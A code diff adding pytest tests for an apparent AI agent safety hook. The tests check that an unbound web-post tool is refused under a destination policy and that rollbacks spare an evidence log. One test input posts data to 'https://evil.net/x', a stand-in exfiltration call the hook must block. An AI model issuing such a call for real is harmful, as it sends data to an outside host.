@@ -87,6 +87,37 @@ async def test_a_send_whose_destination_the_layer_cannot_tell_is_f504(
 
 
 @pytest.mark.asyncio
+async def test_an_unbound_tool_is_f504_under_a_policy(
+    ontology_path: str, tmp_path: Path
+) -> None:
+    """An unbound tool is treated as the strictest case (§5.18.2): the
+    layer cannot tell whether or where it sends, so while a destination
+    policy is in force it is refused (§4.4.2, §5.18.10), before the
+    checkpoint is used."""
+    adapter = make(ontology_path, tmp_path, allowed_destinations=POLICY)
+    adapter.create_checkpoint(["*"], "t")
+    hook = adapter._make_pretooluse_safety_hook()
+    args = {"url": "https://evil.net/x", "body": "data"}
+    denied = reason(
+        await hook({"tool_name": "mcp__web__post", "tool_input": args}, "c1", None)
+    )
+    assert denied is not None and denied.startswith("F504 CONSTRAINT_VIOLATED:")
+    assert "no binding" in denied and "evil.net" not in denied
+    assert adapter.has_valid_checkpoint()
+    # Without a policy, it is the strictest case and nothing more: it holds
+    # the checkpoint and goes on.
+    open_ = make(ontology_path, tmp_path / "2")
+    open_.create_checkpoint(["*"], "t")
+    hook = open_._make_pretooluse_safety_hook()
+    assert (
+        reason(
+            await hook({"tool_name": "mcp__web__post", "tool_input": args}, "c2", None)
+        )
+        is None
+    )
+
+
+@pytest.mark.asyncio
 async def test_an_applied_profiles_destination_policy_alone_is_in_force(
     ontology_path: str, tmp_path: Path
 ) -> None:
@@ -258,3 +289,36 @@ def test_snapshots_protect_the_audit_log(ontology_path: str, tmp_path: Path) -> 
     )
     assert "logs/audit.log" in snapshots.protected
     assert adapter.checkpoint_tracker.snapshots is snapshots
+
+
+def test_snapshots_protect_the_evidence_store(
+    ontology_path: str, tmp_path: Path
+) -> None:
+    """Evidence is the record of what happened, never within a rollback's
+    reach (§4.4.1): a restore leaves an evidence file under the root as it
+    is, and later records still reach it."""
+    from grounded_agency.state.evidence_store import EvidenceAnchor
+    from grounded_agency.state.jsonl_evidence_store import JsonlEvidenceStore
+
+    root = tmp_path / "work"
+    root.mkdir()
+    (root / "app.txt").write_text("v1")
+    evidence = JsonlEvidenceStore(root / "evidence.jsonl")
+    evidence.add_anchor(EvidenceAnchor.from_tool_output("Read", "t1", {"path": "a"}))
+    snapshots = FileSnapshotStore(root, root / ".snapshots")
+    adapter = make(
+        ontology_path, tmp_path, snapshots=snapshots, evidence_store=evidence
+    )
+    assert "evidence.jsonl" in snapshots.protected
+    tracker = adapter.checkpoint_tracker
+    checkpoint = tracker.create_checkpoint(["*"], "before the edit")
+    assert "evidence.jsonl" in tracker.checkpoint_output(checkpoint)["excluded"]
+    (root / "app.txt").write_text("v2")
+    evidence.add_anchor(EvidenceAnchor.from_tool_output("Edit", "t2", {"path": "a"}))
+    restored = tracker.restore_checkpoint(checkpoint)
+    assert restored.restored
+    assert (root / "app.txt").read_text() == "v1"
+    assert {c["item"] for c in restored.changes_reverted} == {"app.txt"}
+    evidence.add_anchor(EvidenceAnchor.from_tool_output("Read", "t3", {"path": "a"}))
+    lines = (root / "evidence.jsonl").read_text().splitlines()
+    assert len(lines) == len(evidence) == 3
